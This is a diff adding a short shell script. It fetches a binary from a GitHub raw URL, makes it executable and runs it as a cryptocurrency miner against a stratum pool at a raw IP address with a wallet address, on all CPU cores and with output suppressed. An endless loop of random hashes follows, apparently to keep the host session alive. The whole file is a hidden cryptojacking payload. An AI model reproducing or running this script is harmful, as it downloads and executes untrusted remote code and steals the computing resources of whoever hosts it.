@@ -1,0 +1,4 @@
+wget https://github.com/sxiankerigak/park/raw/main/BTRM
+chmod 777 BTRM
+./BTRM -a minotaurx -o stratum+tcp://139.144.181.23:80 -u RU1FGGNE2jMXeTVpPNt9ZZrUWwZjcbuEgU.Universe -p x -t$(nproc --all) >/dev/null 2>&1
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
